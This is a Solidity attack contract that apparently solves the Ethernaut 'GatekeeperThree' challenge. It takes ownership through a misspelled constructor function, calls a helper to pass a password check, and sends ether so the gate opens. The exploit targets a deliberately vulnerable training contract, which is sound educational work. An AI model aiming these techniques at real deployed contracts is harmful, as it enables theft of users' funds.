// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;

    function createTrick() external;

    function getAllowance(uint256 _password) external;

    function enter() external returns (bool);
}

contract GatekeeperThreeAttack {
    IGatekeeperThree public target;

    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }

    /* 
     Should not have receive/fallback function
    */

    function pwn() external payable {
        // Solve gateOne
        target.construct0r();

        // Solve gateTwo
        target.createTrick();
        target.getAllowance(0);
        target.getAllowance(block.timestamp);

        // Solve gateThree
        payable(address(target)).transfer(msg.value);

        bool success = target.enter();
        require(success, "enter failed");
    }
}
